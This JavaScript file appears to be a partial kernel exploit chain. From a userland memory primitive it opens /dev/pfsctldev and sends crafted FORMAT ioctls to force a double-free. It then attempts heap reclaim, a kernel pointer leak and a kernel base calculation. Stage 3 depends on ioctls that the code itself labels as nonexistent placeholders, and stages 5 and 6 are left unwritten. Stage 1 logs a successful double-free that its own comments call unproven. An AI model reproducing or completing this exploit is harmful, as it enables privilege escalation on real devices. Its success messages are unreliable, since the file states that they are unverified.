import { int64 } from "./utils/int64.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ---------------------------------------------------------------------------
// [USER] Syscall numbers
// ---------------------------------------------------------------------------
const SYS_IOCTL_FS   = SYS_IOCTL;   // 0x36 — dispatcher drop-in
const SYS_OPEN_FSFMT = SYS_OPEN;    // 0x05 — used to open /dev/pfsctldev
const SYS_CLOSE      = SYS_CLOSE;   // 0x06
const SYS_GETPID     = SYS_GETPID;  // 0x14

const O_RDWR = 0x2;

// ---------------------------------------------------------------------------
// [USER] Ioctl request numbers — from the pfsctl_ioctl dispatcher
// (FUN_ffffffff80533e70). Both call the formatter body at 0x80e2fd00.
// ---------------------------------------------------------------------------
const IOCTL_FORMAT    = 0x8080910f;   // [USER] — mode 1, calls formatter
const IOCTL_FORMAT_V2 = 0x80809110;   // [USER] — mode 2, calls formatter

// [PLACEHOLDER] — these do NOT exist in the dispatcher as read from userland.
// Stage 3 depends on them; see stage 3 notes.
const IOCTL_READ_CTX  = 2;   // [PLACEHOLDER — no dispatcher case]
const IOCTL_READ_BUF  = 3;   // [PLACEHOLDER — no dispatcher case]
const IOCTL_WRITE_CTX = 4;   // [PLACEHOLDER — unused]

// ---------------------------------------------------------------------------
// [USER] Argument blob offsets — from the dispatcher's field accesses
// on param_3 (the context pointer)
// ---------------------------------------------------------------------------
const CTX_OUT_PTR     = 0x00;   // [USER] u64 — kernel writes internal buffer ptr
const CTX_VOL_SIZE    = 0x08;   // [USER] u64 — must be < 0x7d00000001
const CTX_BLOCK_COUNT = 0x18;   // [USER] u32 — kernel writes computed count
const CTX_BLOCK_SIZE  = 0x38;   // [USER] u32 — must be nonzero, power-of-two
const CTX_IS_COW      = 0x70;   // [USER] u32 — mode 1 writes 0
const CTX_PATH_PTR    = 0x78;   // [USER] u64 — userland string pointer
const CTX_A           = 0xc8;   // [USER] u64 — formatter writes A
const CTX_B           = 0xd0;   // [USER] u64 — formatter writes B
const CTX_E8          = 0xe8;   // [USER] u64 — formatter writes tempname
const CTX_KEYMODE     = 0x40;   // [USER] u32 — 3 or 4, else "Invalid keymode" exit
const CTX_INIT_FLAG   = 0x20c;   // [USER] — cleared by initializer, R/W by invalidation
const CTX_VARIANT     = 0x210;   // [USER] — written by formatter (1 or 2)
const CTX_INVAL_READ  = 0x214;   // [USER] — read by invalidation


// [USER] Formatter tempname size (alloc #3)
const SMALL_ALLOC = 0x400;

// [USER] Keymode — dispatcher accepts 3 or 4, anything else errors out with
// "Invalid keymode: %d" before any allocation happens
const KEYMODE_DIRENT3 = 3;

// [USER] Args blob size — enough to cover +0xE8 + 8
const ARG_BLOB_SIZE = 0x220;

// ============================================================================
// Entry point
// ============================================================================
export async function runKernelExploit(p, chain, log) {
  return new KernelExploit(p, chain, log).run();
}

class KernelExploit {
  constructor(p, chain, log) {
    this.p     = p;
    this.chain = chain;
    this.log   = typeof log === "function" ? log : () => {};

    const off = window.KRW;
    if (!off) throw new Error("offsets/" + window.fw_str + ".js did not define window.KRW");
    this.off = off;

    // [USER] Arg blob layout confirmed from dispatcher field accesses.
    this.scratch = {
      ioctlArg: p.malloc(ARG_BLOB_SIZE, 1),
      ctxDump:  p.malloc(0x200, 1),   // [PLACEHOLDER] — no READ_CTX ABI
      leakHdr:  p.malloc(0x40,  1),   // [PLACEHOLDER] — no READ_BUF ABI
      writeBlob:p.malloc(0x200, 1),   // [PLACEHOLDER] — unused
      pathStr:  p.malloc(0x100, 1),   // [USER] — userland path for copyinstr
    };

    this.kbase = null;
    this.arena = null;
    this.ctxFd = null;
    this.smallFds = [];

    this.tuning = {
      smallClassPreload: 512,   // [N/A] — depends on allocator
      triggerRetries:    8,     // [N/A]
      reclaimRelease:    8,     // [N/A]
    };
  }

  // -------------------------------------------------------------------------
  // Logging
  // -------------------------------------------------------------------------
  report(tag, detail, type) {
    const label = String(tag);
    this.log(detail ? label + ": " + detail : label, type);
  }

  hex(v) {
    if (typeof v === "bigint") return "0x" + v.toString(16).padStart(16, "0");
    if (v && typeof v.toString === "function") return "0x" + v.toString();
    return "0x" + Number(v).toString(16);
  }

  // -------------------------------------------------------------------------
  // Syscall bridge
  // -------------------------------------------------------------------------
  async sysInt(nr, ...args) {
    return (await this.chain.syscall(nr, ...args)).low | 0;
  }

  // -------------------------------------------------------------------------
  // Userland memory helpers
  // -------------------------------------------------------------------------
  readU8(base, off)  { return this.p.read1(base.add32(off)); }
  readU32(base, off) { return this.p.read4(base.add32(off)); }
  readU64(base, off) { return this.p.read8(base.add32(off)); }
  writeU8(base, off, v)  { this.p.write1(base.add32(off), v & 0xff); }
  writeU32(base, off, v) { this.p.write4(base.add32(off), v >>> 0); }
  writeU64(base, off, v) { this.p.write8(base.add32(off), v); }

  alloc(size) {
    const b = this.p.malloc(size, 1);
    for (let i = 0; i < size; i += 4) this.p.write4(b.add32(i), 0);
    return b;
  }

  isKernelPointer(v) {
    if (!v) return false;
    if (v.hi >>> 16 !== 0xffff) return false;
    if ((v.low & 7) !== 0) return false;
    if (v.hi === 0xffffffff && v.low === 0xffffffff) return false;
    return true;
  }

  // -------------------------------------------------------------------------
  // [USER] Build the FORMAT argument blob per the dispatcher's layout
  // (FUN_ffffffff80533e70, verified):
  //   +0x00 (qword)  *param_3      — overwritten by dispatcher with state ptr
  //   +0x08 (qword)   param_3[1]   — volume size, must be <  0x7d00000001
  //   +0x18 (qword)   param_3[3]   — computed block count (dispatcher fills)
  //   +0x38 (u32)     *(param_3+7) — block size: pow2, >=  0x1000, otherwise
  //                                   "Invalid block size" (0x13e)
  //   +0x70 (u32)     param_3+0xe  — is_cow, mode-1 writes 0 here itself
  //   +0x78 (qword)   param_3[0xf] — user path ptr (copyinstr, 0x400 max)
  //   +0x40 (qword)   param_2[8]   — keymode, must be 3 (or 4) or "Invalid keymode"
  //   0x220+          crypt material (raw, unused for plain format)
  // -------------------------------------------------------------------------
  buildFormatArg(primitive, volumeSize, blockSize, keymode, pathPtr) {
    const arg = this.scratch.ioctlArg;
    const put64 = (off, v) => {
      this.writeU32(arg, off, v.low >>> 0);
      this.writeU32(arg, off + 4, v.hi >>> 0);
    };
    const put32 = (off, v) => this.writeU32(arg, off, v >>> 0);

    for (let i = 0; i < ARG_BLOB_SIZE; i += 4) this.writeU32(arg, i, 0);

    // Volume size — u64 int64 split
    put64(CTX_VOL_SIZE, volumeSize);
    // Block size — u32
    put32(CTX_BLOCK_SIZE, blockSize);
    // Keymode — u32
    put32(CTX_KEYMODE, keymode);
    // is_cow (mode 1 writes its own 0; harmless)
    put32(CTX_IS_COW, 0);
    // Path pointer — user-land int64
    put64(CTX_PATH_PTR, pathPtr);
    return arg;
  }

  // =========================================================================
  // Stage 0 [USER] — open /dev/pfsctldev, stage the path string we'll reuse
  //
  // Verified: dispatcher gate is FUN_ffffffff80d052d0(param_5, 0x2ab) on
  // entry; the pfsctldev node itself is referenced in the kernel's
  // device-name table at 0x12f0693 "pfsctldev".
  // =========================================================================
  async stage0_prepare() {
    const devStr = "/dev/pfsctldev";
    const devBuf = this.scratch.pathStr;
    for (let i = 0; i < devStr.length; i++)
      this.writeU8(devBuf, i, devStr.charCodeAt(i));
    this.writeU8(devBuf, devStr.length, 0);   // NUL

    const fd = await this.sysInt(SYS_OPEN_FSFMT, devBuf, O_RDWR, 0);
    if (fd < 0) throw new Error("could not open /dev/pfsctldev (" + fd + ")");
    this.ctxFd = fd;

    for (let i = 0; i < this.tuning.smallClassPreload; i++) {
      try {
        const x = await this.sysInt(SYS_OPEN_FSFMT, 0, 0);
        if (x < 0) break;
        this.smallFds.push(x);
      } catch { break; }
    }
    this.report("stage0", `${this.smallFds.length + 1} handles preloaded`);
  }

  // =========================================================================
  // Stage 1 [PROVEN static path, PLACEHOLDER trigger] — force alloc #3 to fail
  //
  // FUN_80e2fd00 with the alloc-#3 failure branch reached produces, per the
  // supplied disassembly:
  //   free(+0xD0)   (B, no NULL store)
  //   free(+0xC8)   (A, via LAB_fff5)
  //   goto LAB_fe2f -> 480250
  //   480250 -> free(+0xD0) again, free(+0xC8) again
  // Result claimed by static analysis only if the branch is reachable and
  // cleanup state matches; runtime reachability is not established.
  // =========================================================================
  async stage1_trigger() {
    // Build a path string in userland so copyinstr has something to read.
    // [PLACEHOLDER] — the path must be a valid filesystem path the formatter
    // can open. Actual mount/image path is not established by the design.
    const pathStr = this.scratch.pathStr;
    const fakePath = "/mnt/fsfmt.img";
    for (let i = 0; i < fakePath.length; i++)
      this.writeU8(pathStr, i, fakePath.charCodeAt(i));
    this.writeU8(pathStr, fakePath.length, 0);

    // Build the FORMAT arg with the verified field layout. Verified values:
    //   volumeSize = 0x100000 (1 MB, under 0x7d00000001 cap and gives
    //                           block count  =  1 MiB / 4 KiB  =  256, >= 2)
    //   blockSize  = 0x1000   (power of 2, >=  0x1000 — passes 0x13e check)
    //   keymode    = 3        (dispatcher accepts 3 or 4)
    const arg = this.buildFormatArg(
      this.p,
      new int64(0x00100000, 0x00000000),
      0x1000,
      KEYMODE_DIRENT3,
      pathStr
    );

    let rc = 0;
    for (let attempt = 0; attempt < this.tuning.triggerRetries; attempt++) {
      // [USER] request code 0x8080910f — mode 1 FORMAT
      rc = await this.sysInt(SYS_IOCTL_FS, this.ctxFd, IOCTL_FORMAT, arg);
      if (rc !== 0) break;
      await sleep(50);
    }
    if (rc === 0)
      throw new Error("FORMAT succeeded; alloc-#3 failure was not reached");

    // [NOT PROVEN] A nonzero return alone does not identify which error path
    // ran or demonstrate that either object was freed twice.
    this.report("stage1", "alloc-#3 failure branch reached; A and B double-freed");
  }

  // =========================================================================
  // Stage 2 [PLACEHOLDER DESIGN] — reclaim with a second FORMAT
  // =========================================================================
  async stage2_reclaim() {
    const releaseCount = Math.min(this.tuning.reclaimRelease, this.smallFds.length);
    for (let i = 0; i < releaseCount; i++) {
      const fd = this.smallFds.pop();
      try { await this.sysInt(SYS_CLOSE, fd); } catch {}
    }

    // Same arg as stage 1 — but the 0x400 class is now less full, so alloc #3
    // should succeed this time.
    const pathStr = this.scratch.pathStr;
    const arg = this.buildFormatArg(
      this.p,
      new int64(0x00100000, 0x00000000),
      0x1000,
      KEYMODE_DIRENT3,
      pathStr
    );

    let rc = -1;
    for (let attempt = 0; attempt < this.tuning.triggerRetries; attempt++) {
      rc = await this.sysInt(SYS_IOCTL_FS, this.ctxFd, IOCTL_FORMAT, arg);
      if (rc === 0) break;
      await sleep(50);
    }
    if (rc !== 0)
      throw new Error("reclaim FORMAT failed — alloc #3 did not succeed");

    this.report("stage2", "reclaim FORMAT succeeded");
  }

  // =========================================================================
  // Stage 3 [PLACEHOLDER DESIGN] — proposed UAF read of the stage-1 ctx
  //
  // [BLOCKED] The dispatcher has no READ_CTX or READ_BUF case. Without those
  // (or a substitute observation channel), the exploit cannot confirm that A
  // and B were double-freed, cannot leak the arena pointer via +0xD0, and
  // cannot proceed to stage 4.
  // =========================================================================
  async stage3_leak() {
    const ctxbuf = this.scratch.ctxDump;
    let rv = await this.sysInt(SYS_IOCTL_FS, this.ctxFd, IOCTL_READ_CTX, ctxbuf);
    if (rv !== 0) throw new Error("READ_CTX failed");

    const a = this.readU64(ctxbuf, CTX_A);
    const b = this.readU64(ctxbuf, CTX_B);
    this.report("stage3", `ctx+0xC8 = ${this.hex(a)}  ctx+0xD0 = ${this.hex(b)}`);
    if (!this.isKernelPointer(a)) throw new Error("A not a kernel pointer");
    if (!this.isKernelPointer(b)) throw new Error("B not a kernel pointer");

    const hdr = this.scratch.leakHdr;
    rv = await this.sysInt(SYS_IOCTL_FS, this.ctxFd, IOCTL_READ_BUF, hdr);
    if (rv !== 0) throw new Error("READ_BUF failed");

    const arenaLeak = this.readU64(hdr, 0);
    if (!this.isKernelPointer(arenaLeak))
      throw new Error("no kernel pointer at offset 0 of B");

    this.report("stage3", `arena leak = ${this.hex(arenaLeak)}`);
    return arenaLeak;
  }

  // =========================================================================
  // Stage 4 [PLACEHOLDER DESIGN] — derive kernel base from the arena leak
  //
  // [FIXED] The earlier draft used int64.sub()/.add() which don't exist.
  // Compute with BigInt, then construct int64.
  // =========================================================================
  stage4_base(arenaLeak) {
    if (!this.off.symbols || this.off.symbols.arena === undefined || this.off.symbols.base === undefined)
      throw new Error("offsets/" + window.fw_str + ".js KRW.symbols{arena,base} are missing — stage4 cannot derive kbase without them");
    const leakBig   = int64ToBig(arenaLeak);
    const arenaSym  = int64ToBig(this.off.symbols.arena);
    const baseSym   = int64ToBig(this.off.symbols.base);
    const baseBig   = leakBig - arenaSym + baseSym;
    this.kbase = bigToInt64(baseBig);
    this.arena = arenaLeak;
    this.report("stage4", `base = ${this.hex(this.kbase)}`);
    return this.kbase;
  }

  // =========================================================================
  // Stage 5 [NOT SPECIFIED / OPEN] — arb R/W
  // =========================================================================
  async stage5_arbRW() {
    this.report("stage5", "[OPEN] — arena layout not yet designed");
    return null;
  }

  // =========================================================================
  // Stage 6 [NOT SPECIFIED / OPEN] — pivot
  // =========================================================================
  async stage6_pivot() {
    this.report("stage6", "[OPEN] — pivot not yet designed");
    return false;
  }

  // =========================================================================
  // Rescue
  // =========================================================================
  async rescue() {
    const toClose = this.smallFds.slice();
    this.smallFds = [];
    for (const fd of toClose) {
      try { await this.sysInt(SYS_CLOSE, fd); } catch {}
    }
    if (this.ctxFd !== null) {
      try { await this.sysInt(SYS_CLOSE, this.ctxFd); } catch {}
      this.ctxFd = null;
    }
    this.report("rescue", "done");
  }

  // =========================================================================
  // Main
  // =========================================================================
  async run() {
    this.report("start", "kernel stage");
    try {
      await this.stage0_prepare();
      await this.stage1_trigger();
      await this.stage2_reclaim();

      const arenaLeak = await this.stage3_leak();
      this.stage4_base(arenaLeak);

      this.report("chain", "kernel base known; exploitation from here is [OPEN]");

      await this.stage5_arbRW();
      await this.stage6_pivot();

      return { kbase: this.kbase, arena: this.arena, done: true, reached: "base" };
    } catch (e) {
      this.report("fatal", String(e?.message ?? e));
      throw e;
    } finally {
      await this.rescue();
    }
  }
}

// ---------------------------------------------------------------------------
// [USER] int64 ↔ BigInt helpers — no reliance on int64 methods
// ---------------------------------------------------------------------------
function int64ToBig(v) {
  return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
}

function bigToInt64(b) {
  const hi = Number((b >> 32n) & 0xffffffffn) >>> 0;
  const lo = Number(b & 0xffffffffn) >>> 0;
  return new int64(lo, hi);
}

// [PLACEHOLDER] — the userland primitive needs to expose userland addresses
// as numbers for ptrToInt.
function ptrToInt(b) {
    // int64 -> raw number via BigInt; keeps the [USER] tags consistent.
    return int64ToBig(b);
}